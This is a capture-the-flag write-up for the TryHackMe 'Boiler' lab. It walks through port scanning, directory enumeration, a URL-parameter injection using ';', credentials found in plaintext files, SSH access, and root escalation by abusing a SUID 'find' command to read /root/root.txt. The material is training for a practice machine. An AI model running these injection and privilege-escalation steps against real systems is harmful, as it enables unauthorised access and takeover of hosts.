---
title: "Boiler CTF - TryHackMe"
author: Ludovic COULON
date: 2020-05-12
hero: ./images/hero.jpeg
excerpt: "Writeup for the Boiler CTF challenge on TryHackMe"
---

[TryHackMe | Retro](https://tryhackme.com/room/retro)

Intermediate level CTF. Just enumerate, you'll get there.

### Setup

```bash
➜  TryHackMe sudo nmap -sV -sC -sS -vv 10.10.198.35
```

```bash
21/tcp    open  ftp     syn-ack ttl 63 vsftpd 3.0.3
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:10.9.2.228
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status

80/tcp    open  http    syn-ack ttl 63 Apache httpd 2.4.18 ((Ubuntu))
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
| http-robots.txt: 1 disallowed entry
|_/
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works

10000/tcp open  http    syn-ack ttl 63 MiniServ 1.930 (Webmin httpd)
|_http-favicon: Unknown favicon MD5: D421EB02E012E5C8728CC7208325C966
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
Service Info: OS: Unix
```

### #1 File extension after anon login

```bash
ftp> ls -la
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 ftp      ftp          4096 Aug 22  2019 .
drwxr-xr-x    2 ftp      ftp          4096 Aug 22  2019 ..
-rw-r--r--    1 ftp      ftp            74 Aug 21  2019 .info.txt
226 Directory send OK.
```

```bash
➜  TryHackMe cat .info.txt
Whfg jnagrq gb frr vs lbh svaq vg. Yby. Erzrzore: Rahzrengvba vf gur xrl!
Just wanted to see if you find it. Lol. Remember: Enumeration is the key! # cesar
```

### #2 What is on the highest port?

```bash
Discovered open port 55007/tcp on 10.10.198.35
55007/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 e3:ab:e1:39:2d:95:eb:13:55:16:d6:ce:8d:f9:11:e5 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC8bsvFyC4EXgZIlLR/7o9EHosUTTGJKIdjtMUyYrhUpJiEdUahT64rItJMCyO47iZTR5wkQx2H8HThHT6iQ5GlMzLGWFSTL1ttIulcg7uyXzWhJMiG/0W4HNIR44DlO8zBvysLRkBSCUEdD95kLABPKxIgCnYqfS3D73NJI6T2qWrbCTaIG5QAS5yAyPERXXz3ofHRRiCr3fYHpVopUbMTWZZDjR3DKv7IDsOCbMKSwmmgdfxDhFIBRtCkdiUdGJwP/g0uEUtHbSYsNZbc1s1a5EpaxvlESKPBainlPlRkqXdIiYuLvzsf2J0ajniPUkvJ2JbC8qm7AaDItepXLoDt
|   256 ae:de:f2:bb:b7:8a:00:70:20:74:56:76:25:c0:df:38 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBLIDkrDNUoTTfKoucY3J3eXFICcitdce9/EOdMn8/7ZrUkM23RMsmFncOVJTkLOxOB+LwOEavTWG/pqxKLpk7oc=
|   256 25:25:83:f2:a7:75:8a:a0:46:b2:12:70:04:68:5c:cb (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPsAMyp7Cf1qf50P6K9P2n30r4MVz09NnjX7LvcKgG2p
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

"ssh"
```

### #3 What's running on port 10000?

```bash
10000/tcp open  http    syn-ack ttl 63 MiniServ 1.930 (Webmin httpd)
Webmin
```

### #4 Can you exploit the service running on that port? (yay/nay answer)

```bash
nay
```

### #5 What's CMS can you access?

```bash
➜  TryHackMe gobuster dir -u http://10.10.198.35 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.198.35
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/05/13 20:10:05 Starting gobuster
===============================================================
/manual (Status: 301)
/**joomla** (Status: 301)
Progress: 10483 / 220561 (4.75%)^C
[!] Keyboard interrupt detected, terminating.
===============================================================
2020/05/13 20:11:54 Finished
===============================================================
```

### #6 Keep enumerating, you'll know when you find it.

```bash
No answer needed
```

### #7 The interesting file name in the folder?

```bash
➜  TryHackMe dirb http://10.10.198.35/joomla /usr/share/wordlists/dirb/common.txt

-----------------
DIRB v2.22
By The Dark Raver
-----------------

START_TIME: Wed May 13 20:33:11 2020
URL_BASE: http://10.10.198.35/joomla/
WORDLIST_FILES: /usr/share/wordlists/dirb/common.txt

-----------------

GENERATED WORDS: 4612

---- Scanning URL: http://10.10.198.35/joomla/ ----
==> DIRECTORY: http://10.10.198.35/joomla/_archive/
==> DIRECTORY: http://10.10.198.35/joomla/_database/
==> DIRECTORY: http://10.10.198.35/joomla/_files/
==> DIRECTORY: http://10.10.198.35/joomla/_test/
```

<div className="Image__Medium">
  <img src="https://imgur.com/nJRseqa.png" alt="blog_image" />
</div>

If we click on the "New" button we have possibly an LFI attack

<div className="Image__Medium">
  <img src="https://imgur.com/nRn1A0R.png" alt="blog_image" />
</div>

Let's try that !

<div className="Image__Medium">
  <img src="https://imgur.com/0Jivfmw.png" alt="blog_image" />
</div>

Nothing there.. Maybe with an ";" before ?

<div className="Image__Medium">
  <img src="https://imgur.com/qGtaeGc.png" alt="blog_image" />
</div>

YES ! We have an LFI attack let's read the file

```bash
log.txt
```

<div className="Image__Medium">
  <img src="https://imgur.com/iECqhfa.png" alt="blog_image" />
</div>

You can complete this with manual enumeration, but do it as you wish

### #1 Where was the other users pass stored(no extension, just the name)?

```bash
TryHackMe ssh basterd@10.10.198.35 -p 55007

The authenticity of host [10.10.198.35]:55007 ([10.10.198.35]:55007) cant be established.
ECDSA key fingerprint is SHA256:mvrEiZlb4jqadxXJccZYZkCL/DHElLVQ74eKaSKZiRk.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added [10.10.198.35]:55007 (ECDSA) to the list of known hosts.

basterd@10.10.198.35 password: "superduperp@$$"

Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-142-generic i686)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

8 packages can be updated.
8 updates are security updates.

Last login: Thu Aug 22 12:29:45 2019 from 192.168.1.199
```

```bash
$ pwd
/home/basterd
$ ls
backup.sh
```

### #2 user.txt

```bash
$ cat backup.sh
REMOTE=1.2.3.4

SOURCE=/home/stoner
TARGET=/usr/local/backup

LOG=/home/stoner/bck.log

DATE=`date +%y\.%m\.%d\.`

USER=stoner
"superduperp@$$no1knows"

ssh $USER@$REMOTE mkdir $TARGET/$DATE

if [ -d "$SOURCE" ]; then
    for i in `ls $SOURCE | grep 'data'`;do
	     echo "Begining copy of" $i  >> $LOG
	     scp  $SOURCE/$i $USER@$REMOTE:$TARGET/$DATE
	     echo $i "completed" >> $LOG

		if [ -n `ssh $USER@$REMOTE ls $TARGET/$DATE/$i 2>/dev/null` ];then
		    rm $SOURCE/$i
		    echo $i "removed" >> $LOG
		    echo "####################" >> $LOG
				else
					echo "Copy not complete" >> $LOG
					exit 0
		fi
    done


else

    echo "Directory is not present" >> $LOG
    exit 0
fi
```

```bash
Stoner password : "superduperp@$$no1knows"
```

```bash
stoner@Vulnerable:~$ ls -la
total 20
drwxr-x--- 4 stoner stoner 4096 May 14 03:47 .
drwxr-xr-x 4 root   root   4096 Aug 22  2019 ..
drwx------ 2 stoner stoner 4096 May 14 03:47 .cache
drwxrwxr-x 2 stoner stoner 4096 Aug 22  2019 .nano
-rw-r--r-- 1 stoner stoner   34 Aug 21  2019 .secret
stoner@Vulnerable:~$ cat .secret
You made it till here, well done.
```

### #3 What did you exploit to get the privileged user?

[find | GTFOBins](https://gtfobins.github.io/gtfobins/find/)

```bash
stoner@Vulnerable:~$ find . -exec whoami \; -quit
root
stoner@Vulnerable:~$
```

### #4 root.txt

```bash
stoner@Vulnerable:~$ find . -exec cat /root/root.txt \; -quit
It wasn't that hard, was it?
stoner@Vulnerable:~$
```
